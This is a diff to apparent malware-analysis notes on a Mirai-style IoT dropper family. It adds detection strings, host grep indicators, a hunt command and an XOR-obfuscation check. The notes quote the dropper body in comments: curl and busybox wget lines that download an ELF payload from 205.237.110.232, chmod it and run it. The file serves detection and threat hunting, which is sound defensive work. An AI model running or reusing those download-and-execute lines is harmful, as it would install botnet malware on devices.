@@ -74,12 +74,32 @@ f6f9c5f16c7d2b9e4df3b132c05f356c9abc48a7ee1d5f079016338bc2030e40   # /mipsel, 68
 # detection strings in the family, being non-dictionary and stable:
 #   VFASXC -> arm     WQZRTY -> arm5    YUIOXC -> arm7
 #   GHJKLB -> mips    MNCXOP -> mipsel
+#
+# TWO FURTHER NAMES, never fetched — added 2026-08-08:
+#   PLXMKJ    KFGDFG
+# Both appear in the droppers' `rm -rf` preamble (7 names cleaned, only 5
+# downloaded) but neither is retrieved from 205.237.110.232. They are
+# cleanup targets for architecture builds this kit ships but these two hosts
+# did not serve. Hunt on them: a host carrying PLXMKJ or KFGDFG was hit by a
+# variant of this dropper we have not captured.
 # VirusTotal : /wget.sh 15/60 (downloader.shell/bashdlod).
 #              /curl.sh and all 5 ELF payloads have no VT record at capture.
 
 # [DROPPER BODY, per architecture]
 # curl http://205.237.110.232/arm -o VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
 # busybox wget http://205.237.110.232/arm -O VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
+
+# [OBFUSCATION — checked, none present]
+# The five ELF payloads were swept across the full single-byte XOR keyspace
+# (1-255) on 2026-08-08, specifically including 0x22 — the effective key of
+# Mirai's table.c under the leaked-source default TABLE_KEY 0xdeadbeef
+# (0xef^0xbe^0xad^0xde == 0x22). ZERO meaningful strings were recovered at
+# any key.
+#
+# This family stores no obfuscated configuration. Contrast MIRAI_OHSHIT,
+# whose payloads DO carry a 0x22-obfuscated HTTP flood kit. The "genuinely
+# IP-only" assessment above is therefore established by negative result, not
+# assumed from the absence of plaintext domains.
 
 # [HOST-BASED GREP STRINGS]
 # "205.237.110.232"
@@ -89,6 +109,8 @@ f6f9c5f16c7d2b9e4df3b132c05f356c9abc48a7ee1d5f079016338bc2030e40   # /mipsel, 68
 # "YUIOXC"
 # "GHJKLB"
 # "MNCXOP"
+# "PLXMKJ"    <- cleanup-only; uncaptured build
+# "KFGDFG"    <- cleanup-only; uncaptured build
 
 # [HOST HUNT]
 # grep -rl "205.237.110.232\|telnet.curl" /tmp /var/tmp /home /root 2>/dev/null
